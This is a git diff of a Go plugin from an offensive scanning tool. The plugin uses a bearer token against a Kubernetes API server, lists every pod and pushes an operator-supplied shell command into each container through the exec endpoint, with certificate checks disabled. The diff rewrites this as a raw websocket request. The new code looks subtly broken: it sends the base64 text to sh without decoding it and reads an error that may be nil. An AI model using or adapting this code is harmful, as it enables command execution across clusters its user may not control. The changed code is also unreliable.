@@ -1,28 +1,23 @@
 package plugins
 
 import (
-	"bytes"
+	"crypto/tls"
 	"encoding/base64"
+	"errors"
 	"fmt"
+	"io/ioutil"
 	"log"
+	"net/http"
 	"net/url"
 	"strings"
+	"time"
 
 	"github.com/404tk/lazyscan/common"
 	"github.com/404tk/lazyscan/pkg/schema"
 	"github.com/tidwall/gjson"
-	"k8s.io/client-go/rest"
-	"k8s.io/client-go/tools/remotecommand"
 )
 
-type KubeAPIConfig struct {
-	Command string
-	Config  *rest.Config
-}
-
 func KubeAPIServerScan(info *common.HostInfo) (bool, error) {
-	config := getConfig(info.Host, info.Port, info.Token)
-
 	opts := schema.K8sRequestOption{
 		Token:    info.Token,
 		Endpoint: fmt.Sprintf("https://%s:%s", info.Host, info.Port),
@@ -54,11 +49,7 @@ func KubeAPIServerScan(info *common.HostInfo) (bool, error) {
 	cmd := info.Command.TCPCommand
 	if cmd != "" {
 		b64 := base64.StdEncoding.EncodeToString([]byte(cmd))
-
-		var kubeconf = &KubeAPIConfig{
-			Command: fmt.Sprintf("echo %s | base64 -d | sh", b64),
-			Config:  config,
-		}
+		urlecd := url.QueryEscape(b64)
 		for _, p := range pods {
 			pn := p.Get("metadata.name").String()
 			ns := p.Get("metadata.namespace").String()
@@ -67,36 +58,44 @@ func KubeAPIServerScan(info *common.HostInfo) (bool, error) {
 				api := fmt.Sprintf(opts.Endpoint+
 					"/api/v1/namespaces/%s/pods/%s/exec"+
 					"?container=%s&command=/bin/sh&command=-c&command=%s&stderr=true&stdin=true&stdout=true",
-					ns, pn, c.Get("name").String(), url.QueryEscape(cmd))
-				kubeconf.kubeAPIExec(api)
+					ns, pn, c.Get("name").String(), urlecd)
+				_, err := kubeAPIExec(info, api)
+				if strings.Contains(err.Error(), "forbidden") &&
+					strings.Contains(err.Error(), "pods/exec") {
+					return false, err
+				}
 			}
 		}
 	}
 	return true, err
 }
 
-func (conf *KubeAPIConfig) kubeAPIExec(api string) {
-	u, err := url.ParseRequestURI(api)
-	executor, err := remotecommand.NewSPDYExecutor(conf.Config, "POST", u)
-	if err != nil {
-		return
-	}
-	// 使用bytes.Buffer变量接收标准输出和标准错误
-	var stdout, stderr bytes.Buffer
-	executor.Stream(remotecommand.StreamOptions{
-		Stdin:  strings.NewReader(""),
-		Stdout: &stdout,
-		Stderr: &stderr,
-	})
-}
-
-func getConfig(ip, port, token string) *rest.Config {
-	return &rest.Config{
-		Host:        fmt.Sprintf("https://%s:%s/", ip, port),
-		BearerToken: token,
-		TLSClientConfig: rest.TLSClientConfig{
-			Insecure: true, // 设置为true时 不需要CA
-			// CAData: []byte(ca_crt),
+func kubeAPIExec(info *common.HostInfo, api string) (bool, error) {
+	httpclient := &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 		},
+		Timeout: time.Duration(info.Timeout) * time.Second,
 	}
+	req, err := http.NewRequest("GET", api, nil)
+	if err != nil {
+		return false, err
+	}
+	req.Header.Add("Authorization", "Bearer "+info.Token)
+	req.Header.Add("Connection", "Upgrade")
+	req.Header.Add("Upgrade", "websocket")
+	req.Header.Add("Sec-Websocket-Version", "13")
+	req.Header.Add("Sec-Websocket-Key", "lazyscan")
+	resp, err := httpclient.Do(req)
+	if err != nil {
+		return false, err
+	}
+	raw, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return false, err
+	}
+	if resp.StatusCode == http.StatusSwitchingProtocols {
+		return true, nil
+	}
+	return false, errors.New(string(raw))
 }
